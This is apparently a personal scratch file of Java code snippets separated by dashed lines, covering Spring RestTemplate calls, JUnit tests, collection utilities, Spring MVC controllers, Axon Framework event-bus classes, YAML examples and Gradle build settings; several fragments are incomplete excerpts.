      fprocess: "cat"
      no_proxy: "gateway"
      https_proxy: $https_proxy
--------------------------------------------------------------------------------------------------------
HttpHeaders headers = new HttpHeaders();
headers.set("Accept", MediaType.APPLICATION_JSON_VALUE);

UriComponentsBuilder builder = UriComponentsBuilder.fromHttpUrl(url)
        .queryParam("msisdn", msisdn)
        .queryParam("email", email)
        .queryParam("clientVersion", clientVersion)
        .queryParam("clientType", clientType)
        .queryParam("issuerName", issuerName)
        .queryParam("applicationName", applicationName);

HttpEntity<?> entity = new HttpEntity<>(headers);

HttpEntity<String> response = restTemplate.exchange(
        builder.toUriString(), 
        HttpMethod.GET, 
        entity, 
        String.class);
		
Map<String, String> vars = new HashMap<>();
vars.put("hotel", "42");
vars.put("room", "21");

restTemplate.getForObject("http://example.com/hotels/{hotel}/rooms/{hotel}", 
    String.class, vars);
	
  @Value("${endpoint.url}")
  private String endpointURL;
  // you can use variable args feature in Java
  public String requestParamMethodNameHere(String value1, String value2) {
    RestTemplate restTemplate = new RestTemplate();
    restTemplate
           .getMessageConverters()
           .add(new MappingJackson2HttpMessageConverter());

    HttpHeaders headers = new HttpHeaders();
    headers.set("Accept", MediaType.APPLICATION_JSON_VALUE);
    HttpEntity<String> entity = new HttpEntity<>(headers);

    try {
      String formatted_URL = MessageFormat.format(endpointURL, value1, value2);
      ResponseEntity<String> response = restTemplate.exchange(
                    formatted_URL ,
                    HttpMethod.GET,
                    entity,
                    String.class);
     return response.getBody();
    } catch (Exception e) { e.printStackTrace(); }
	
    String uri = http://my-rest-url.org/rest/account/{account};

    Map<String, String> uriParam = new HashMap<>();
    uriParam.put("account", "my_account");

    UriComponents builder = UriComponentsBuilder.fromHttpUrl(uri)
                .queryParam("pageSize","2")
                        .queryParam("page","0")
                        .queryParam("name","my_name").build();

    HttpEntity<String> requestEntity = new HttpEntity<>(null, getHeaders());

    ResponseEntity<String> strResponse = restTemplate.exchange(builder.toUriString(),HttpMethod.GET, requestEntity,
                        String.class,uriParam);

    //final URL: http://my-rest-url.org/rest/account/my_account?pageSize=2&page=0&name=my_name
--------------------------------------------------------------------------------------------------------
@Test
public void whenModifyingOriginalObject_thenGsonCloneShouldNotChange() {
    Address address = new Address("Downing St 10", "London", "England");
    User pm = new User("Prime", "Minister", address);
    Gson gson = new Gson();
    User deepCopy = gson.fromJson(gson.toJson(pm), User.class);
 
    address.setCountry("Great Britain");
 
    assertThat(deepCopy.getAddress().getCountry())
      .isNotEqualTo(pm.getAddress().getCountry());
}

@Test
public void whenModifyingOriginalObject_thenJacksonCopyShouldNotChange() throws IOException {
    Address address = new Address("Downing St 10", "London", "England");
    User pm = new User("Prime", "Minister", address);
    ObjectMapper objectMapper = new ObjectMapper();
     
    User deepCopy = objectMapper
      .readValue(objectMapper.writeValueAsString(pm), User.class);
 
    address.setCountry("Great Britain");
 
    assertThat(deepCopy.getAddress().getCountry())
      .isNotEqualTo(pm.getAddress().getCountry());
}

@Test
public void givenListOfCustomers_whenTransformed_thenListOfAddress() {
    Collection<Address> addressCol = CollectionUtils.collect(list1, 
      new Transformer<Customer, Address>() {
        public Address transform(Customer customer) {
            return customer.getAddress();
        }
    });
     
    List<Address> addressList = new ArrayList<>(addressCol);
    assertTrue(addressList.size() == 3);
    assertTrue(addressList.get(0).getLocality().equals("locality1"));
}

@Test
public void givenCustomerList_WhenFiltered_thenCorrectSize() {
     
    boolean isModified = CollectionUtils.filter(linkedList1, 
      new Predicate<Customer>() {
        public boolean evaluate(Customer customer) {
            return Arrays.asList("Daniel","Kyle").contains(customer.getName());
        }
    });
      
    assertTrue(linkedList1.size() == 2);
}

@Test
public void givenCustomerListAndASubcollection_whenChecked_thenTrue() {
    assertTrue(CollectionUtils.isSubCollection(list3, list1));
}
@Test
public void givenTwoLists_whenIntersected_thenCheckSize() {
    Collection<Customer> intersection = CollectionUtils.intersection(list1, list3);
    assertTrue(intersection.size() == 2);
}
@Test
public void givenTwoLists_whenSubtracted_thenCheckElementNotPresentInA() {
    Collection<Customer> result = CollectionUtils.subtract(list1, list3);
    assertFalse(result.contains(customer1));
}
@Test
public void givenTwoLists_whenUnioned_thenCheckElementPresentInResult() {
    Collection<Customer> union = CollectionUtils.union(list1, list2);
  
    assertTrue(union.contains(customer1));
    assertTrue(union.contains(customer4));
}
@Test
public void givenTwoSortedLists_whenCollated_thenSorted() {
    List<Customer> sortedList = CollectionUtils.collate(list1, list2);
 
    assertEquals(6, sortedList.size()); 
    assertTrue(sortedList.get(0).getName().equals("Bob"));
    assertTrue(sortedList.get(2).getName().equals("Daniel"));
}
@Test
public void givenList_whenAddIgnoreNull_thenNoNullAdded() {
    CollectionUtils.addIgnoreNull(list1, null);
  
    assertFalse(list1.contains(null));
}
--------------------------------------------------------------------------------------------------------
import static org.fest.assertions.Assertions.assertThat;
import static org.powermock.api.mockito.PowerMockito.mockStatic;
import static org.powermock.api.mockito.PowerMockito.verifyStatic;

import java.util.List;

import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.mockito.ArgumentCaptor;
import org.mockito.Captor;
import org.mockito.MockitoAnnotations;
import org.powermock.core.classloader.annotations.PrepareForTest;
import org.powermock.modules.junit4.PowerMockRunner;

@RunWith(PowerMockRunner.class)
@PrepareForTest(HelperClass.class)
public class MyClassTest {

    private MyClass classUnderTest;

    @Captor
    private ArgumentCaptor<String> fileNameCaptor;

    @Captor
    private ArgumentCaptor<List<String>> dataCaptor;

    @Before
    public void setup() {
        MockitoAnnotations.initMocks(this);
        mockStatic(HelperClass.class);
        classUnderTest = new MyClass();
    }

    @Test
    public void shouldMakeNastyStaticCall() {
        classUnderTest.testMethod();

        verifyStatic();
        HelperClass.nastyStaticCall(fileNameCaptor.capture(), dataCaptor.capture());

        assertThat(fileNameCaptor.getValue()).isEqualTo("FILENAME");
        assertThat(dataCaptor.getValue()).containsOnly("Data");
    }
}
--------------------------------------------------------------------------------------------------------
    <dependency>
        <groupId>org.unitils.objectvalidation</groupId>
        <artifactId>unitils-objectvalidation</artifactId>
        <version>1.1.4</version>
    </dependency>
--------------------------------------------------------------------------------------------------------
ComparatorChain chain = new ComparatorChain(Arrays.asList(
   new BeanComparator("size"), 
   new BeanComparator("nrOfToppings"), 
   new BeanComparator("name")));

Collections.sort(pizzas, chain);

Collections.sort(pizzas, new Comparator<Pizza>() {  
    @Override  
    public int compare(Pizza p1, Pizza p2) {  
        return ComparisonChain.start().compare(p1.size, p2.size).compare(p1.nrOfToppings, p2.nrOfToppings).compare(p1.name, p2.name).result();  
        // or in case the fields can be null:  
        /* 
        return ComparisonChain.start() 
           .compare(p1.size, p2.size, Ordering.natural().nullsLast()) 
           .compare(p1.nrOfToppings, p2.nrOfToppings, Ordering.natural().nullsLast()) 
           .compare(p1.name, p2.name, Ordering.natural().nullsLast()) 
           .result(); 
        */  
    }  
});

class MultiComparator<T> implements Comparator<T> {
    private final List<Comparator<T>> comparators;

    public MultiComparator(List<Comparator<? super T>> comparators) {
        this.comparators = comparators;
    }

    public MultiComparator(Comparator<? super T>... comparators) {
        this(Arrays.asList(comparators));
    }

    public int compare(T o1, T o2) {
        for (Comparator<T> c : comparators) {
            int result = c.compare(o1, o2);
            if (result != 0) {
                return result;
            }
        }
        return 0;
    }

    public static <T> void sort(List<T> list, Comparator<? super T>... comparators) {
        Collections.sort(list, new MultiComparator<T>(comparators));
    }
}
--------------------------------------------------------------------------------------------------------
RestTemplate restTemplate = new RestTemplate();
ResponseEntity<List<Employee>> response = restTemplate.exchange(
  "http://localhost:8080/employees/",
  HttpMethod.GET,
  null,
  new ParameterizedTypeReference<List<Employee>>(){});
List<Employee> employees = response.getBody();

List<Employee> newEmployees = new ArrayList<>();
newEmployees.add(new Employee(3, "Intern"));
newEmployees.add(new Employee(4, "CEO"));
 
restTemplate.postForObject(
  "http://localhost:8080/employees",
  new EmployeeList(newEmployees),
  ResponseEntity.class);
--------------------------------------------------------------------------------------------------------
/**
 * Print extra information about a compiled automaton file.
 */
@Parameters(
    commandNames = "fsa_info",
    commandDescription = "Print extra information about a compiled automaton file.")
public class FSAInfo extends CliTool {
  @Parameter(
      names = {"-i", "--input"},
      description = "The input automaton.", 
      required = true,
      validateValueWith = ValidateFileExists.class)
  private Path input;

  FSAInfo() {
  }

  public FSAInfo(Path input) {
    this.input = checkNotNull(input);
  }

  @Override
  public ExitStatus call() throws Exception {
    final FSA fsa;
    try (InputStream is = new BufferedInputStream(Files.newInputStream(input))) {
      fsa = FSA.read(is);
    }
}
--------------------------------------------------------------------------------------------------------
# {0} - status code; {1} - status reason message
exception.sending.error.response=I/O exception occurred while sending "{0}/{1}" error response.
# {0} - exception message
failed.to.start.server=Failed to start Grizzly HTTP server: {0}
--------------------------------------------------------------------------------------------------------
    @Bean                 
    public LocaleResolver localeResolver() {

        SessionLocaleResolver localResolver=new SessionLocaleResolver();
        localResolver.setDefaultLocale(Locale.US);
        return localResolver;
    }
--------------------------------------------------------------------------------------------------------
    @NullOrNotBlank(message = "{personalData.language.nullOrNotBlank}")
    private String language;
--------------------------------------------------------------------------------------------------------
    public static void main (String[] args) {
        String[] appArgs = {"--debug"};
        //String[] appArgs = {"--debug", "--spring.jmx.enabled=false"};
  /*      String[] appArgs = {"--debug", "--spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.jmx.JmxAutoConfiguration"};*/

        SpringApplication app = new SpringApplication(ExcludeConfigExample.class);
        app.setBannerMode(Banner.Mode.OFF);
        app.setLogStartupInfo(false);
        app.run(appArgs);
    }
--------------------------------------------------------------------------------------------------------
import org.hamcrest.Description;
import org.hamcrest.Factory;
import org.hamcrest.Matcher;
import org.hamcrest.TypeSafeMatcher;

public class IsPositiveInteger extends TypeSafeMatcher<Integer> {

	public void describeTo(Description description) {
		description.appendText("a positive integer");
	}

	@Factory
	public static Matcher<Integer> isAPositiveInteger() {
		return new IsPositiveInteger();
	}

	@Override
	protected boolean matchesSafely(Integer integer) {
		return integer > 0;
	}
}
--------------------------------------------------------------------------------------------------------
import com.luv2code.springdemo.models.Customer;
import org.springframework.beans.propertyeditors.StringTrimmerEditor;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.WebDataBinder;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;

import javax.validation.Valid;

@Controller
@RequestMapping("/customer")
public class CustomerController {

    @RequestMapping("/")
    public String index() {
        return "customer/list/index";
    }

    @RequestMapping("/add")
    public String add(
        Model model
    ) {
        model.addAttribute("customer", new Customer());
        return "customer/add/index";
    }

    // TODO: Using POST as I dislike gets for this, even if they are easier...
    @PostMapping("/add/process")
    public String addProcess(
        @Valid @ModelAttribute("customer") Customer customer,
        BindingResult bindingResult,
        final RedirectAttributes redirectAttributes
    ) {
        // TODO: DEBUG
        System.out.println(bindingResult);
        if (bindingResult.hasErrors()) {
            return "customer/add/index";
        }
        // TODO: TEMP as this example does not include persistence
        redirectAttributes.addAttribute("firstName", customer.getFirstName());
        redirectAttributes.addAttribute("lastName", customer.getLastName());
        redirectAttributes.addAttribute("description", customer.getDescription());
        redirectAttributes.addAttribute("age", customer.getAge());
        redirectAttributes.addAttribute("zipCode", customer.getZipCode());
        redirectAttributes.addAttribute("branch", customer.getBranch());
        return "redirect:/customer/add/success";
    }

    @RequestMapping("/add/success")
    public String success(
        @RequestParam(value = "firstName") String firstName,
        @RequestParam(value = "lastName") String lastName,
        @RequestParam(value = "description") String description,
        @RequestParam(value = "age") String age,
        @RequestParam(value = "zipCode") String zipCode,
        @RequestParam(value = "branch") String branch,
        Model model
    ) {
        model.addAttribute("customer", new Customer(
            firstName,
            lastName,
            description,
            Integer.parseInt(age),
            zipCode,
            branch
        ));
        return "customer/add/success";
    }

    /**
     * Add an initBinder to handle strings that are empty
     *
     * @param dataBinder
     */
    @InitBinder
    public void initBinder(WebDataBinder dataBinder) {
        dataBinder.registerCustomEditor(String.class, new StringTrimmerEditor(true));
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

import javax.validation.Valid;

/**
 * Created by Javier on 23/12/2015.
 */

@Controller
public class PersonController {

    @RequestMapping(value = "/form", method = RequestMethod.GET)
    public String showForm(Person person){
        return "form";
    }

    @RequestMapping(value = "/form", method = RequestMethod.POST)
    public String checkPersonInfo(@Valid Person person, BindingResult bindingResult, Model model){
        if(bindingResult.hasErrors()){
            return "form";
        }

        return "redirect:/results";
    }

    @RequestMapping("/results")
    public String result(){
        return "results";
    }
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@WebAppConfiguration
@ContextConfiguration(classes = MyWebConfig.class)
public class ControllerTest {

    @Autowired
    private WebApplicationContext wac;
    private MockMvc mockMvc;

    @Before
    public void setup () {
        DefaultMockMvcBuilder builder = MockMvcBuilders.webAppContextSetup(this.wac);
        this.mockMvc = builder.build();
    }

    @Test
    public void testUserController () throws Exception {
        MockHttpServletRequestBuilder builder =
                                      MockMvcRequestBuilders.post("/test")
                                        .header("testHeader",
                                                "headerValue")
                                        .content("test body");
        this.mockMvc.perform(builder)
                    .andExpect(MockMvcResultMatchers.status()
                                                    .isOk())
                    .andDo(MockMvcResultHandlers.print());
--------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@WebAppConfiguration
@ContextConfiguration(classes = MyWebConfig.class)
public class ControllerTest {

    @Autowired
    private WebApplicationContext wac;
    private MockMvc mockMvc;

    @Before
    public void setup () {
        DefaultMockMvcBuilder builder = MockMvcBuilders.webAppContextSetup(this.wac);
        this.mockMvc = builder.build();
    }

    @Test
    public void testUserController () throws Exception {

        MockHttpServletRequestBuilder builder =
                                   MockMvcRequestBuilders.post("/user")
                                        .header("testHeader",
                                                "headerValue")
                                        .contentType(MediaType.APPLICATION_JSON)
                                        .content(createUserInJson("joe",
                                                            "joe@example.com"));
        this.mockMvc.perform(builder)
                    .andExpect(MockMvcResultMatchers.status()
                                                    .isOk())
                    .andDo(MockMvcResultHandlers.print());
    }

    private static String createUserInJson (String name, String email) {
        return "{ \"name\": \"" + name + "\", " +
                            "\"emailAddress\":\"" + email + "\"}";
    }
}
--------------------------------------------------------------------------------------------------------
multiliners:
    ugly_multiline: "ugly\nugly\nugly\nugly\n"

    multiline_with_line_ending: |
        multiline text
        with ending

    multiline_without_line_ending: |-
        multiline text
        without ending
		
singleliners:
    simple: 
        single
        line
        text

    single-line-text: >-
        single
        line
        text

    single-line-text-with-line-ending: >
        single
        line
        text
		
commands:
    - do something with --a long --list of --parameters 
    - do something 
      with 
      --a long 
      --list of 
      --parameters 
	  
json:
    vm-profiles-yaml:
        small:
            cpu:  2
            ram:  2
            disk: 10
            os: rhel6 
        large:
            cpu:  4
            ram:  4
            disk: 10
            os: rhel6 

    vm-profiles-json:
        small:  { cpu: 2, ram: 2, disk: 10, os: rhel6 } 
        large:  { cpu: 4, ram: 4, disk: 10, os: rhel6 } 
		
matrices:
    matrix_json_style: [
        [1, 0, 0],
        [0, 1, 0],
        [0, 0, 1],
    ]
    matrix_yaml_style: 
      - [1, 0, 0]
      - [0, 1, 0]
      - [0, 0, 1]
	  
inheritance:
    _basic: &basic
        cpu:  2
        ram:  2
        disk: 10
        os: rhel6 

    vm-profiles:
        small: 
            <<: *basic
            cpu: 1
        large: 
            <<: *basic
            cpu: 4
			
inheritance:
    _basic: &basic
        cpu:  2
        ram:  2
        disk: 10
        os: rhel6 

    vm-profiles:
        small: {<<: *basic,  cpu: 1}
        large: {<<: *basic,  cpu: 4}
		
references:
    value1: &reference "Don't repeat yourself!"  
    value2: *reference 
	
# requires PyYAML
alias yaml2json='python -c "import sys,yaml,json;sys.tracebacklimit=0;print(json.dumps(yaml.load(open(sys.argv[1]).read()), indent=2))"'
--------------------------------------------------------------------------------------------------------
import com.google.common.collect.Lists;
import java.util.Arrays;
import java.util.List;

// Convert List<String> to List<Integer>
class ListUtil
{
	// Program to convert List of String to List of Integer using Guava
	public static void main(String args[])
	{
		List<String> list = Arrays.asList("-1", "2", "3", "4", "5");

		List<Integer> newList = Lists.transform(list, Integer::parseInt);
		System.out.println(newList);
	}
}

import com.google.common.base.Function;
import com.google.common.collect.Iterables;
import java.util.Arrays;
import java.util.List;

class ListUtil
{
	// Program to Convert List<String> to Iterable<Integer> using Guava
	public static void main(String args[])
	{
		List<String> list = Arrays.asList("-1", "2", "3", "4", "5");

		Iterable<Integer> iterable = Iterables.transform(list, 
														Integer::valueOf);

		System.out.println(iterable);
	}
}

Iterables.transform(list, new Function<String, Object>() {
	@Override
	public Integer apply(String s) {
		return Integer.valueOf(s);
	}
});

import com.google.common.collect.Collections2;

import java.util.Arrays;
import java.util.Collection;
import java.util.List;

class ListUtil
{
	// Program to Convert List<String> to Collection<Integer> using Guava
	public static void main(String args[])
	{
		List<String> list = Arrays.asList("-1", "2", "3", "4", "5");

		Collection<Integer> collection = Collections2.transform(list,
															Integer::valueOf);

		System.out.println(collection);
	}
}
--------------------------------------------------------------------------------------------------------
#!/usr/bin/env bash

if [ "$#" -ne 1 ]
then
  echo "Usage: yaml2html <name without .yaml extension>"
  exit 1
fi

cat $1.yaml | yaml2yeast | yeast2html > $1.html

#!/usr/bin/env bash
# build docker image to run Yaml reference
docker build -t yaml-reference .
--------------------------------------------------------------------------------------------------------
import io.grpc.stub.StreamObserver;

/**
 * Author: marc
 */
public class SynchronizedStreamObserver<T>
        implements StreamObserver<T> {

    private final StreamObserver<T> delegate;

    public SynchronizedStreamObserver(
            StreamObserver<T> delegate) {
        this.delegate = delegate;
    }

    @Override
    public void onNext(T t) {
        synchronized (delegate) {
            delegate.onNext(t);
        }
    }

    @Override
    public void onError(Throwable throwable) {
        delegate.onError(throwable);
    }

    @Override
    public void onCompleted() {
        delegate.onCompleted();
    }
}

import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

/**
 * Composite of {@link MessageDispatchInterceptor}s that apply all interceptors in the order of registration.
 *
 * @author Sara Pellegrini
 * @since 4.0
 */
public class DispatchInterceptors<M extends Message<?>> {

    private final List<MessageDispatchInterceptor<? super M>> dispatchInterceptors = new CopyOnWriteArrayList<>();

    public Registration registerDispatchInterceptor(MessageDispatchInterceptor<? super M> dispatchInterceptor) {
        dispatchInterceptors.add(dispatchInterceptor);
        return () -> dispatchInterceptors.remove(dispatchInterceptor);
    }

    @SuppressWarnings("unchecked")
    public <T extends M> T intercept(T message) {
        T messageToDispatch = message;
        for (MessageDispatchInterceptor<? super M> interceptor : dispatchInterceptors) {
            messageToDispatch = (T) interceptor.handle(messageToDispatch);
        }
        return messageToDispatch;
    }
}

import io.axoniq.axonserver.grpc.ErrorMessage;

import static org.axonframework.common.ObjectUtils.getOrDefault;

/**
 * Author: marc
 */
public class ExceptionSerializer {

    public static ErrorMessage serialize(String client, Throwable t) {
        ErrorMessage.Builder builder = ErrorMessage.newBuilder().setLocation(getOrDefault(client, "")).setMessage(
                t.getMessage() == null ? t.getClass().getName() : t.getMessage());
        builder.addDetails(t.getMessage() == null ? t.getClass().getName() : t.getMessage());
        while (t.getCause() != null) {
            t = t.getCause();
            builder.addDetails(t.getMessage() == null ? t.getClass().getName() : t.getMessage());
        }
        return builder.build();
    }
}

   /**
     * A {@link StreamObserver} implementation used to return a single result, upon which it completes the given
     * {@link CompletableFuture}.
     *
     * @param <T> the type of the single result
     */
    private class SingleResultStreamObserver<T> implements StreamObserver<T> {

        private final String context;
        private final CompletableFuture<T> future;

        private SingleResultStreamObserver(String context, CompletableFuture<T> future) {
            this.context = context;
            this.future = future;
        }

        @Override
        public void onNext(T t) {
            future.complete(t);
        }

        @Override
        public void onError(Throwable throwable) {
            checkConnectionException(throwable, context);
            future.completeExceptionally(GrpcExceptionParser.parse(throwable));
        }

        @Override
        public void onCompleted() {
            if (!future.isDone()) {
                future.completeExceptionally(new AxonServerException(
                        "AXONIQ-0001", "Async call completed before answer"
                ));
            }
        }
    }
--------------------------------------------------------------------------------------------------------
   public static List<DomainEventMessage<?>> createEvents(int numberOfEvents) {
        return IntStream.range(0, numberOfEvents)
                        .mapToObj(sequenceNumber -> createEvent(TYPE,
                                                                IdentifierFactory.getInstance().generateIdentifier(),
                                                                AGGREGATE,
                                                                sequenceNumber,
                                                                PAYLOAD + sequenceNumber,
                                                                METADATA))
                        .collect(Collectors.toList());
    }
--------------------------------------------------------------------------------------------------------
    private static class StubTrackingEventStream implements TrackingEventStream {


        private final Queue<TrackedEventMessage<?>> eventMessages;

        public StubTrackingEventStream(long... tokens) {
            GapAwareTrackingToken lastToken = GapAwareTrackingToken.newInstance(-1, emptySortedSet());
            eventMessages = new LinkedList<>();
            for (Long seq : tokens) {
                lastToken = lastToken.advanceTo(seq, 1000);
                eventMessages.add(new GenericTrackedEventMessage<>(lastToken, createEvent(seq)));
            }
        }

        @Override
        public Optional<TrackedEventMessage<?>> peek() {
            if (eventMessages.isEmpty()) {
                return Optional.empty();
            }
            return Optional.of(eventMessages.peek());
        }

        @Override
        public boolean hasNextAvailable(int timeout, TimeUnit unit) {
            return !eventMessages.isEmpty();
        }

        @Override
        public TrackedEventMessage<?> nextAvailable() {
            return eventMessages.poll();
        }

        @Override
        public void close() {

        }
    }
--------------------------------------------------------------------------------------------------------
select 1 from dual
--------------------------------------------------------------------------------------------------------
    /**
     * Publish a collection of events on this bus (one, or multiple). The events will be dispatched to all subscribed
     * listeners.
     * <p>
     * Implementations may treat the given {@code events} as a single batch and distribute the events as such to
     * all subscribed EventListeners.
     *
     * @param events The collection of events to publish
     */
    default void publish(EventMessage<?>... events) {
        publish(Arrays.asList(events));
    }

    /**
     * Publish a collection of events on this bus (one, or multiple). The events will be dispatched to all subscribed
     * listeners.
     * <p>
     * Implementations may treat the given {@code events} as a single batch and distribute the events as such to
     * all subscribed EventListeners.
     *
     * @param events The collection of events to publish
     */
    void publish(List<? extends EventMessage<?>> events);
--------------------------------------------------------------------------------------------------------
   @JsonGetter("upperSegmentToken")
    @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)
    public TrackingToken upperSegmentToken() {
        return upperSegmentToken;
    }
--------------------------------------------------------------------------------------------------------
/**
 * Singleton ErrorHandler implementation that does not do anything.
 *
 * @author Rene de Waele
 */
public enum PropagatingErrorHandler implements ErrorHandler, ListenerInvocationErrorHandler {

    /**
     * Singleton instance of a {@link PropagatingErrorHandler}.
     */
    INSTANCE;

    /**
     * Singleton instance of a {@link PropagatingErrorHandler}.
     *
     * @return the singleton instance of {@link PropagatingErrorHandler}
     */
    public static PropagatingErrorHandler instance() {
        return INSTANCE;
    }

    @Override
    public void onError(Exception exception, EventMessage<?> event, EventMessageHandler eventHandler) throws Exception {
        throw exception;
    }

    @Override
    public void handleError(ErrorContext errorContext) throws Exception {
        Throwable error = errorContext.error();
        if (error instanceof Error) {
            throw (Error) error;
        } else if (error instanceof Exception) {
            throw (Exception) error;
        } else {
            throw new EventProcessingException("An error occurred while handling an event", error);
        }
    }
}
--------------------------------------------------------------------------------------------------------
import org.axonframework.common.AxonConfigurationException;
import org.axonframework.monitoring.MessageMonitor;
import org.axonframework.monitoring.NoOpMessageMonitor;

/**
 * Implementation of the {@link EventBus} that dispatches events in the thread the publishes them.
 *
 * @author Allard Buijze
 * @since 0.5
 */
public class SimpleEventBus extends AbstractEventBus {

    /**
     * Instantiate a Builder to be able to create a {@link SimpleEventBus}.
     * <p>
     * The {@link MessageMonitor} is defaulted to a {@link NoOpMessageMonitor} and the {@code queueCapacity} to
     * {@link Integer#MAX_VALUE}.
     *
     * @return a Builder to be able to create a {@link SimpleEventBus}
     */
    public static Builder builder() {
        return new Builder();
    }

    /**
     * Instantiate a {@link SimpleEventBus} based on the fields contained in the {@link Builder}.
     *
     * @param builder the {@link Builder} used to instantiate a {@link SimpleEventBus} instance
     */
    protected SimpleEventBus(Builder builder) {
        super(builder);
    }

    /**
     * Builder class to instantiate a {@link SimpleEventBus}.
     * <p>
     * The {@link MessageMonitor} is defaulted to a {@link NoOpMessageMonitor}.
     */
    public static class Builder extends AbstractEventBus.Builder {

        @Override
        public Builder messageMonitor(MessageMonitor<? super EventMessage<?>> messageMonitor) {
            super.messageMonitor(messageMonitor);
            return this;
        }

        /**
         * Initializes a {@link SimpleEventBus} as specified through this Builder.
         *
         * @return a {@link SimpleEventBus} as specified through this Builder
         */
        public SimpleEventBus build() {
            return new SimpleEventBus(this);
        }

        /**
         * Validates whether the fields contained in this Builder are set accordingly.
         *
         * @throws AxonConfigurationException if one field is asserted to be incorrect according to the Builder's
         *                                    specifications
         */
        @Override
        protected void validate() throws AxonConfigurationException {
            super.validate();
        }
    }
}
--------------------------------------------------------------------------------------------------------

import org.axonframework.common.Priority;
import org.axonframework.messaging.Message;
import org.axonframework.messaging.annotation.AbstractAnnotatedParameterResolverFactory;
import org.axonframework.messaging.annotation.ParameterResolver;
import org.axonframework.messaging.annotation.ParameterResolverFactory;

import java.time.Instant;

/**
 * AbstractAnnotatedParameterResolverFactory that accepts parameters with type {@link Instant} that are annotated
 * with the {@link Timestamp} annotation and assigns the timestamp of the EventMessage.
 *
 * @author Allard Buijze
 * @since 2.0
 */
@Priority(Priority.HIGH)
public final class TimestampParameterResolverFactory
        extends AbstractAnnotatedParameterResolverFactory<Timestamp, Instant> {

    private final ParameterResolver<Instant> resolver;

    /**
     * Initializes a {@link ParameterResolverFactory} for {@link Timestamp}
     * annotated parameters
     */
    public TimestampParameterResolverFactory() {
        super(Timestamp.class, Instant.class);
        resolver = new TimestampParameterResolver();
    }

    @Override
    protected ParameterResolver<Instant> getResolver() {
        return resolver;
    }

    /**
     * ParameterResolver that resolved Timestamp parameters
     */
    static class TimestampParameterResolver implements ParameterResolver<Instant> {

        @Override
        public Instant resolveParameterValue(Message message) {
            if (message instanceof EventMessage) {
                return ((EventMessage) message).getTimestamp();
            }
            return null;
        }

        @Override
        public boolean matches(Message message) {
            return message instanceof EventMessage;
        }
    }
}
--------------------------------------------------------------------------------------------------------
    private abstract class Instruction implements Runnable {

        private final CompletableFuture<Boolean> result;
        public Instruction(CompletableFuture<Boolean> result) {
            this.result = result;
        }

        public void run() {
            try {
                executeWithRetry(() -> transactionManager.executeInTransaction(() -> result.complete(runSafe())),
                                 re -> ExceptionUtils.findException(re, UnableToClaimTokenException.class).isPresent(),
                                 tokenClaimInterval, MILLISECONDS, 10);
            } catch (Exception e) {
                result.completeExceptionally(e);
            }
        }

        protected abstract boolean runSafe();
    }
--------------------------------------------------------------------------------------------------------
   @ConditionalOnMissingQualifiedBean(beanClass = Serializer.class, qualifier = "!eventSerializer,messageSerializer")
   
    @Bean
    @ConditionalOnMissingBean
    @ConditionalOnBean(GlobalMetricRegistry.class)
    @ConditionalOnProperty(value = "axon.metrics.auto-configuration.enabled", matchIfMissing = true)
    public static MetricsConfigurerModule metricsConfigurerModule(GlobalMetricRegistry globalMetricRegistry) {
        return new MetricsConfigurerModule(globalMetricRegistry);
    }
--------------------------------------------------------------------------------------------------------
import com.codahale.metrics.MetricRegistry;
import org.axonframework.metrics.GlobalMetricRegistry;
import org.axonframework.metrics.MetricsConfigurerModule;
import org.axonframework.springboot.MetricsProperties;
import org.springframework.boot.autoconfigure.AutoConfigureBefore;
import org.springframework.boot.autoconfigure.condition.ConditionalOnBean;
import org.springframework.boot.autoconfigure.condition.ConditionalOnClass;
import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;
import org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

/**
 * Auto configuration to set up Metrics for the infrastructure components.
 *
 * @author Steven van Beelen
 * @since 3.2
 */
@Configuration
@AutoConfigureBefore(AxonAutoConfiguration.class)
@ConditionalOnMissingBean(MicrometerMetricsAutoConfiguration.class)
@ConditionalOnClass(name = {
        "com.codahale.metrics.MetricRegistry",
        "org.axonframework.metrics.GlobalMetricRegistry"
})
@EnableConfigurationProperties(MetricsProperties.class)
public class MetricsAutoConfiguration {

    @Bean
    @ConditionalOnMissingBean(MetricRegistry.class)
    public static MetricRegistry metricRegistry() {
        return new MetricRegistry();
    }

    @Bean
    @ConditionalOnMissingBean
    @ConditionalOnBean(MetricRegistry.class)
    public static GlobalMetricRegistry globalMetricRegistry(MetricRegistry metricRegistry) {
        return new GlobalMetricRegistry(metricRegistry);
    }

    @Bean
    @ConditionalOnMissingBean
    @ConditionalOnBean(GlobalMetricRegistry.class)
    @ConditionalOnProperty(value = "axon.metrics.auto-configuration.enabled", matchIfMissing = true)
    public static MetricsConfigurerModule metricsConfigurerModule(GlobalMetricRegistry globalMetricRegistry) {
        return new MetricsConfigurerModule(globalMetricRegistry);
    }
}

    @Bean
    @ConditionalOnMissingBean(MetricsConfigurerModule.class)
    @ConditionalOnBean(GlobalMetricRegistry.class)
    @ConditionalOnProperty(value = "axon.metrics.auto-configuration.enabled", matchIfMissing = true)
    public static MetricsConfigurerModule metricsConfigurerModule(GlobalMetricRegistry globalMetricRegistry) {
        return new MetricsConfigurerModule(globalMetricRegistry);
    }
--------------------------------------------------------------------------------------------------------
apply plugin: "java"

repositories {
  mavenCentral()
}

dependencies {
  testCompile 'org.junit.jupiter:junit-jupiter-api:5.2.0'
  testRuntime 'org.junit.jupiter:junit-jupiter-engine:5.2.0'
}

test {
  useJUnitPlatform()

  reports {
    html.enabled = true
  }
}

def junitJupiterVersion = '5.3.2'

apply plugin: "java"

repositories {
  mavenCentral()
}

dependencies {
